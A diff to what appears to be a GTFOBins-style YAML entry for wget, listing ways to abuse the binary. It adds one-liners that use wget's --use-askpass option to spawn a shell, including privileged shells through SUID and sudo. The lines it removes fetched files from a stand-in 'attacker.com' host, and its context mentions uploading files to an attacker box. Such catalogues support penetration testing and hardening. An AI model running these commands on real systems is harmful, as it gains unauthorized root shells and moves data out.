@@ -1,5 +1,11 @@
 ---
 functions:
+  shell:
+    - code: |
+        TF=$(mktemp)
+        chmod +x $TF
+        echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+        wget --use-askpass=$TF 0
   file-upload:
     - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
       code: |
@@ -25,15 +31,15 @@ functions:
         LFILE=file_to_save
         wget $URL -O $LFILE
   suid:
-    - description: Fetch a remote file via HTTP GET request.
-      code: |
-        URL=http://attacker.com/file_to_get
-        LFILE=file_to_save
-        ./wget $URL -O $LFILE
+    - code: |
+        TF=$(mktemp)
+        chmod +x $TF
+        echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
+        ./wget --use-askpass=$TF 0
   sudo:
-    - description: Fetch a remote file via HTTP GET request.
-      code: |
-        URL=http://attacker.com/file_to_get
-        LFILE=file_to_save
-        sudo wget $URL -O $LFILE
+    - code: |
+        TF=$(mktemp)
+        chmod +x $TF
+        echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+        sudo wget --use-askpass=$TF 0
 ---
